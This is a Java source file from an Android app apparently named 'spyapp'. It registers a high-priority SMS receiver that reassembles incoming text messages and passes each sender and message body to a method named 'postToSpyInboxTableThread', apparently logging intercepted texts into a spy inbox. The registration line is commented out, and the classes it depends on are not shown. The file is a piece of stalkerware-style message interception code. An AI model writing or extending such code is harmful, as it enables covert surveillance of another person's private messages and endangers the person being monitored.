package com.example.spyapp.sms;

import com.example.spyapp.Services;
import com.example.spyapp.util.Util;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsMessage;
import android.util.Log;

public class Texter{
	
	private SMSReceiver receiver;
	private static boolean receivingEnabled;
	
	private static Services service;
	
	public Texter(Services formservice) {
		IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
		intentFilter.setPriority(1000);
		receiver = new SMSReceiver();
		receivingEnabled = true;
	//	formservice.registerReceiver(receiver, intentFilter);
	}
	
	
	public static class SMSReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			SmsMessage[] messages = getMessagesFromIntent(intent);
			if (messages != null && messages.length > 0) {
				String messageText=new String();//BA-675
		        for(int j=0;j<messages.length;j++){
		        	messageText+=messages[j].getMessageBody().toString();
		        }//BA-675
				SmsMessage message = messages[0];
				if (message != null) {
					String from;
					try {
						from = message.getOriginatingAddress();
					} catch (NullPointerException e) {
						// This happens sometimes on phones, not sure why. It seems to be outside the
						// US when this happens though.
						Log.e("Texter", "Message received, but no originating address was found!");
						return;
					}
					MessageReceived(from, messageText, context);
				} else {
					Log.i("Texter", "Sms message suppposedly received but with no actual content.");
				}
			} else {
				Log.i("Texter", "Received broadcast for inbound SMS, but unable to retreive the data.");
			}
		}
	}
	
	public static void MessageReceived(String number, String messageText, Context context) {
			Log.d("Simple", "MessageReceived");
	         SMSUtil.getInstance().postToSpyInboxTableThread(service, number, messageText);
	}
	
	public static SmsMessage[] getMessagesFromIntent(Intent intent) {
		Object[] messages = (Object[]) intent.getSerializableExtra("pdus");
		if (messages == null) {
			return null;
		}
		byte[][] pduObjs = new byte[messages.length][];

		for (int i = 0; i < messages.length; i++) {
			pduObjs[i] = (byte[]) messages[i];
		}
		byte[][] pdus = new byte[pduObjs.length][];
		int pduCount = pdus.length;
		SmsMessage[] msgs = new SmsMessage[pduCount];
		for (int i = 0; i < pduCount; i++) {
			pdus[i] = pduObjs[i];
			msgs[i] = SmsMessage.createFromPdu(pdus[i]);
		}
		return msgs;
	}
	
	  public void setCoreService(Services service1) {
	        service = service1;
	  }
}
